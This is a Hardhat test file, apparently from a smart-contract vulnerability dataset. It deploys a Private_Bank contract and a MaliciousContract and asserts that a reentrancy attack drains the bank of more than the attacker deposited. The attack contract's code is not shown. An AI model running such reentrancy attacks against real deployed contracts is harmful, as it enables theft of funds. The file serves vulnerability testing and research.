const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const fs = require("fs");
describe("Reentrancy Attack for 0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12.sol", function () {
  let Private_Bank;
  let victim;
  let MaliciousContract;
  let hacker;
  let Log;
  let log;

  beforeEach(async function () {
    // Deploy Log contract
    const logPath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/reentrancy/0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12.sol/Log.json",
    );
    const logJson = JSON.parse(fs.readFileSync(logPath));
    Log = await ethers.getContractFactory(logJson.abi, logJson.bytecode);
    log = await Log.deploy();
    await log.waitForDeployment();

    // Deploy Private_Bank contract with Log address
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/reentrancy/0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12.sol/Private_Bank.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    Private_Bank = await ethers.getContractFactory(json.abi, json.bytecode);
    victim = await Private_Bank.deploy(log.target);
    await victim.waitForDeployment();
    //await victim.setLog(log.target); // Set Log address after deployment

    // Deploy MaliciousContract with Private_Bank address
    MaliciousContract = await ethers.getContractFactory(
      "contracts/reentrancy/0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12_attack.sol:MaliciousContract",
    );
    hacker = await MaliciousContract.deploy(victim.target);
  });

  it("functional check: reentrancy/0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12.sol", async function () {
    const [v, a] = await ethers.getSigners();
    const amount = ethers.parseEther("10");
    //oracle: verify that Deposit on Private_Bank works as expected
    await expect(victim.connect(a).Deposit({ value: amount })).to.not.be
      .reverted;
    expect(await ethers.provider.getBalance(victim.target)).to.equal(amount);

    //oracle: verify that CashOut on Private_Bank works as expected
    const balanceBefore = await ethers.provider.getBalance(a.address);
    const tx = await victim.connect(a).CashOut(amount);
    const receipt = await tx.wait();
    const gasFee = receipt.gasUsed * receipt.gasPrice;
    expect(await ethers.provider.getBalance(victim.target)).to.equal(0);
    expect(await ethers.provider.getBalance(a.address)).to.equal(
      balanceBefore + amount - gasFee,
    );
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to victim contract
    await victim.Deposit({ value: ethers.parseEther("5") });

    const victimInitialBalance = await ethers.provider.getBalance(
      victim.target,
    );
    expect(victimInitialBalance).to.equal(ethers.parseEther("5"));

    // Initial deposit from hacker on victim contract
    await hacker.deposit({ value: ethers.parseEther("2") });

    const victimBalanceAfterDeposit = await ethers.provider.getBalance(
      victim.target,
    );
    expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("7"));

    // Set hacker balance to 0
    await network.provider.send("hardhat_setBalance", [hacker.target, "0x0"]);
    let hackerBalance = await ethers.provider.getBalance(hacker.target);
    expect(hackerBalance).to.equal(0);

    // Perform reentrancy attack through MaliciousContract
    await hacker.attack(ethers.parseEther("2"));

    // Check balances after attack
    const victimBalance = await ethers.provider.getBalance(victim.target);
    hackerBalance = await ethers.provider.getBalance(hacker.target);

    // Verify the attack was successful

    // victim has lost more funds than the hacker balance (7-2=5)
    expect(victimBalance).to.be.below(ethers.parseEther("5"));

    // hacker has more than the hacker initial deposit (2)
    expect(hackerBalance).to.be.above(ethers.parseEther("2"));
  });
});
